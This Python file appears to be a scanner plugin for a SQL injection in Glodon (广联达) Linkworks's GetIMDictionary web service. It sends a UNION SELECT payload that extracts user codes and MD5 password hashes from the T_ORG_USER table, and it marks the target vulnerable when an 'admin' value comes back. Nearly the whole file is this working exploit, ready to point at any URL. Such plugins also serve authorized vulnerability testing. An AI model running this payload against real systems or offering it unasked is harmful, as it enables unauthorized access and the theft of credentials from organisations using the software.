#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/webapp/广联达/广联达 Linkworks GetIMDictionary SQL注入漏洞.html',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '广联达 Linkworks GetIMDictionary SQL 注入',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/x-www-form-urlencoded',
      }
  target = '/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary'
  data = '''key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --'''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'<?xml version.*?encoding.*?value=.*?admin.*?',res.text,re.S):
      res.close()
      ret['huixian'] = res.text
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret